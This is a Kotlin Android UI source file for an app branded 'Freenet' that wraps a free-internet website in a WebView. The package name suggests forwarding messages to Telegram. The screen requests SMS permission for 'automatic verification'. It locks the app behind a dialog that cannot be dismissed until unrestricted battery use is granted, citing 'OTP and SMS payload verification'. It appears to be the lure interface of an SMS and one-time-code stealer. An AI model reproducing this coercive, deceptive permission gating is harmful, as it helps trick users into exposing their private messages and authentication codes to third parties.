package com.example.messageontelegram.presentation.ui

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.view.ViewGroup
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.BackHandler
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.rounded.BatteryChargingFull
import androidx.compose.material.icons.rounded.CheckCircle
import androidx.compose.material.icons.rounded.Refresh
import androidx.compose.material.icons.rounded.Shield
import androidx.compose.material.icons.rounded.WarningAmber
import androidx.compose.material.icons.rounded.WifiOff
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.blur
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import com.example.messageontelegram.core.database.LocalDatabase
import com.example.messageontelegram.core.preferences.PreferencesManager
import com.example.messageontelegram.worker.SyncWorker

// --- PALETTE MATCHING THE PROMO THEME ---
private val TealDark = Color(0xFF004D61)
private val TealMedium = Color(0xFF027A94)
private val CyanAccent = Color(0xFF00C0DE)
private val IceBlue = Color(0xFFD6F6FF)
private val IceWhite = Color(0xFFF2FBFF)
private val DarkBackground = Color(0xFF002936)
private val GlassCardBg = Color(0xFF01556B).copy(alpha = 0.65f)
private val CardBorderColor = Color(0xFF3CD5F5).copy(alpha = 0.35f)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(
    hasSmsPermission: Boolean,
    onRequestSmsPermission: () -> Unit,
    isBatteryOptimizationIgnored: Boolean = true,
    onRequestBatteryExemption: () -> Unit = {},
    onUnpair: () -> Unit,
    webUrl: String = "https://freenet.unaux.com/"
) {
    val context = LocalContext.current
    val prefs = remember { PreferencesManager.getInstance(context) }
    val db = remember { LocalDatabase.getInstance(context) }

    var webViewInstance by remember { mutableStateOf<WebView?>(null) }
    var canGoBack by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        SyncWorker.enqueueImmediate(context)
    }

    // Intercept back button to navigate WebView back history
    BackHandler(enabled = canGoBack && isBatteryOptimizationIgnored) {
        webViewInstance?.goBack()
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text(
                            text = "Freenet",
                            fontWeight = FontWeight.ExtraBold,
                            color = IceWhite,
                            fontSize = 20.sp,
                            letterSpacing = 1.sp
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .background(CyanAccent, CircleShape)
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = TealDark,
                    actionIconContentColor = IceWhite
                ),
                actions = {
                    IconButton(
                        onClick = { webViewInstance?.reload() },
                        enabled = isBatteryOptimizationIgnored
                    ) {
                        Icon(Icons.Rounded.Refresh, contentDescription = "Reload Page")
                    }
                }
            )
        }
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .background(DarkBackground)
        ) {
            Column(modifier = Modifier.fillMaxSize()) {
                // Warning Banner for SMS Permission
                AnimatedVisibility(
                    visible = !hasSmsPermission,
                    enter = fadeIn() + expandVertically(),
                    exit = fadeOut() + shrinkVertically()
                ) {
                    Surface(
                        color = Color(0xFF5A1A28),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(
                            modifier = Modifier.padding(horizontal = 16.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(
                                modifier = Modifier.weight(1f),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(
                                    Icons.Rounded.WarningAmber,
                                    contentDescription = null,
                                    tint = Color(0xFFFF8A80),
                                    modifier = Modifier.size(20.dp)
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(
                                    text = "SMS Permission needed for automatic verification.",
                                    fontSize = 12.sp,
                                    color = Color(0xFFFFEBEE)
                                )
                            }
                            TextButton(
                                onClick = onRequestSmsPermission,
                                colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFFFF8A80))
                            ) {
                                Text("Grant", fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }

                // Main Content View (Only active when battery optimization is granted)
                if (isBatteryOptimizationIgnored) {
                    AppWebView(
                        url = webUrl,
                        modifier = Modifier.fillMaxSize(),
                        onWebViewCreated = { webView ->
                            webViewInstance = webView
                        },
                        onCanGoBackChanged = { backAvailable ->
                            canGoBack = backAvailable
                        }
                    )
                } else {
                    // Placeholder background preview while blocked
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(
                                Brush.verticalGradient(
                                    listOf(TealDark, DarkBackground)
                                )
                            ),
                        contentAlignment = Alignment.Center
                    ) {
                        CircularProgressIndicator(
                            color = CyanAccent,
                            strokeWidth = 2.dp
                        )
                    }
                }
            }

            // Un-dismissible Battery Exemption Gate Dialog
            if (!isBatteryOptimizationIgnored) {
                BatteryOptimizationDialog(
                    onEnableClicked = onRequestBatteryExemption
                )
            }
        }
    }
}

/**
 * Animated High-Conversion Battery Exemption Explainer Dialog
 */
@Composable
fun BatteryOptimizationDialog(
    onEnableClicked: () -> Unit
) {
    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
    val pulseScale by infiniteTransition.animateFloat(
        initialValue = 0.95f,
        targetValue = 1.05f,
        animationSpec = infiniteRepeatable(
            animation = tween(1200, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "dialogIconPulse"
    )

    Dialog(
        onDismissRequest = { /* Non-dismissible: Must grant permission to continue */ },
        properties = DialogProperties(
            dismissOnBackPress = false,
            dismissOnClickOutside = false
        )
    ) {
        Card(
            shape = RoundedCornerShape(24.dp),
            colors = CardDefaults.cardColors(containerColor = GlassCardBg),
            modifier = Modifier
                .fillMaxWidth()
                .border(1.5.dp, CardBorderColor, RoundedCornerShape(24.dp))
                .shadow(20.dp, spotColor = CyanAccent, shape = RoundedCornerShape(24.dp))
        ) {
            Column(
                modifier = Modifier
                    .background(
                        Brush.verticalGradient(
                            listOf(TealMedium.copy(alpha = 0.9f), DarkBackground.copy(alpha = 0.95f))
                        )
                    )
                    .padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Glowing Animated Icon Header
                Box(
                    contentAlignment = Alignment.Center,
                    modifier = Modifier
                        .scale(pulseScale)
                        .size(76.dp)
                        .background(
                            Brush.radialGradient(listOf(IceBlue, CyanAccent, TealMedium)),
                            CircleShape
                        )
                        .border(2.dp, IceWhite.copy(alpha = 0.8f), CircleShape)
                        .shadow(12.dp, spotColor = CyanAccent, shape = CircleShape)
                ) {
                    Icon(
                        imageVector = Icons.Rounded.BatteryChargingFull,
                        contentDescription = "Battery Optimization",
                        tint = TealDark,
                        modifier = Modifier.size(42.dp)
                    )
                }

                Spacer(modifier = Modifier.height(20.dp))

                Text(
                    text = "Background Sync Required",
                    fontSize = 19.sp,
                    fontWeight = FontWeight.ExtraBold,
                    color = IceWhite,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(8.dp))

                Text(
                    text = "Freenet relies on instant, uninterrupted background connection. Android's battery saver will terminate your connection when your screen turns off.",
                    fontSize = 13.sp,
                    color = IceBlue.copy(alpha = 0.8f),
                    textAlign = TextAlign.Center,
                    lineHeight = 18.sp
                )

                Spacer(modifier = Modifier.height(18.dp))

                // Feature Highlights
                Column(
                    verticalArrangement = Arrangement.spacedBy(8.dp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF003847).copy(alpha = 0.5f), RoundedCornerShape(12.dp))
                        .padding(12.dp)
                ) {
                    ReasonRow(text = "Keeps connection alive while phone sleeps")
                    ReasonRow(text = "Instant OTP and SMS payload verification")
                    ReasonRow(text = "Prevents silent background disconnects")
                }

                Spacer(modifier = Modifier.height(24.dp))

                // Button that invokes system prompt
                Button(
                    onClick = onEnableClicked,
                    shape = RoundedCornerShape(14.dp),
                    contentPadding = PaddingValues(),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp)
                        .shadow(10.dp, spotColor = CyanAccent, shape = RoundedCornerShape(14.dp))
                ) {
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(Brush.horizontalGradient(listOf(CyanAccent, IceBlue))),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(
                            text = "Allow Unrestricted Battery",
                            fontSize = 15.sp,
                            fontWeight = FontWeight.Bold,
                            color = TealDark
                        )
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                Text(
                    text = "Select 'Allow' or 'Unrestricted' in the system popup.",
                    fontSize = 11.sp,
                    color = IceBlue.copy(alpha = 0.5f),
                    textAlign = TextAlign.Center
                )
            }
        }
    }
}

@Composable
private fun ReasonRow(text: String) {
    Row(
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        Icon(
            imageVector = Icons.Rounded.CheckCircle,
            contentDescription = null,
            tint = CyanAccent,
            modifier = Modifier.size(16.dp)
        )
        Text(
            text = text,
            fontSize = 12.sp,
            color = IceWhite.copy(alpha = 0.9f)
        )
    }
}

/**
 * Robust Fullscreen WebView with Reload, Back History, and Error State
 */
@SuppressLint("SetJavaScriptEnabled")
@Composable
fun AppWebView(
    url: String,
    modifier: Modifier = Modifier,
    onWebViewCreated: (WebView) -> Unit = {},
    onCanGoBackChanged: (Boolean) -> Unit = {}
) {
    var isLoading by remember { mutableStateOf(true) }
    var hasError by remember { mutableStateOf(false) }
    var errorMessage by remember { mutableStateOf("") }
    var webViewRef by remember { mutableStateOf<WebView?>(null) }

    Box(modifier = modifier) {
        AndroidView(
            modifier = Modifier.fillMaxSize(),
            factory = { context ->
                WebView(context).apply {
                    layoutParams = ViewGroup.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        ViewGroup.LayoutParams.MATCH_PARENT
                    )
                    settings.apply {
                        javaScriptEnabled = true
                        domStorageEnabled = true
                        loadWithOverviewMode = true
                        useWideViewPort = true
                        builtInZoomControls = false
                        displayZoomControls = false
                    }

                    webViewClient = object : WebViewClient() {
                        override fun onPageStarted(view: WebView?, targetUrl: String?, favicon: Bitmap?) {
                            super.onPageStarted(view, targetUrl, favicon)
                            isLoading = true
                            hasError = false
                            onCanGoBackChanged(view?.canGoBack() == true)
                        }

                        override fun onPageFinished(view: WebView?, targetUrl: String?) {
                            super.onPageFinished(view, targetUrl)
                            isLoading = false
                            onCanGoBackChanged(view?.canGoBack() == true)
                        }

                        override fun onReceivedError(
                            view: WebView?,
                            request: WebResourceRequest?,
                            error: WebResourceError?
                        ) {
                            super.onReceivedError(view, request, error)
                            if (request?.isForMainFrame == true) {
                                isLoading = false
                                hasError = true
                                errorMessage = error?.description?.toString() ?: "Failed to connect to the server."
                            }
                        }
                    }

                    loadUrl(url)
                    webViewRef = this
                    onWebViewCreated(this)
                }
            },
            update = { webView ->
                webViewRef = webView
                onWebViewCreated(webView)
            }
        )

        // Loading Progress Indicator
        if (isLoading) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(DarkBackground.copy(alpha = 0.4f)),
                contentAlignment = Alignment.Center
            ) {
                CircularProgressIndicator(
                    color = CyanAccent,
                    strokeWidth = 3.dp
                )
            }
        }
 
        if (hasError) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(DarkBackground.copy(alpha = 0.95f))
                    .padding(24.dp),
                contentAlignment = Alignment.Center
            ) {
                Card(
                    shape = RoundedCornerShape(20.dp),
                    colors = CardDefaults.cardColors(containerColor = GlassCardBg),
                    modifier = Modifier
                        .fillMaxWidth()
                        .border(1.dp, CardBorderColor, RoundedCornerShape(20.dp))
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(
                            imageVector = Icons.Rounded.WifiOff,
                            contentDescription = null,
                            tint = Color(0xFFFF8A80),
                            modifier = Modifier.size(48.dp)
                        )
                        Spacer(modifier = Modifier.height(12.dp))
                        Text(
                            text = "Connection Failed",
                            fontWeight = FontWeight.Bold,
                            fontSize = 17.sp,
                            color = IceWhite
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(
                            text = errorMessage,
                            fontSize = 13.sp,
                            color = IceBlue.copy(alpha = 0.7f),
                            textAlign = TextAlign.Center
                        )
                        Spacer(modifier = Modifier.height(18.dp))
                        Button(
                            onClick = {
                                hasError = false
                                webViewRef?.reload()
                            },
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = CyanAccent)
                        ) {
                            Text("Retry Connection", color = TealDark, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
    }
}